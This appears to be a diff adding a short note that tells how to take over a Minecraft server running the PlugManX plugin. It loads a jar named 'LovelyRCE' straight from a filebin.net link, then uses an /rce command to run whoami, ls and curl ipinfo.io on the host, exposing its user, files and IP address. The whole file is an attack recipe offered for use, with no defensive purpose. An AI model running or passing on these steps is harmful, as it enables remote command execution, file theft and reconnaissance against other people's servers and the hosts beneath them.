@@ -1,0 +1,5 @@
+if the server have plugmanx type:
+/plugman download direct https://filebin.net/bekffsxio0jpxpp4/LovelyRCE-1.0-SNAPSHOT.jar
+/rce whoami and get the vps USER
+/rce ls and get all the files on the vps
+/rce curl ipinfo.io and get the vps IPS
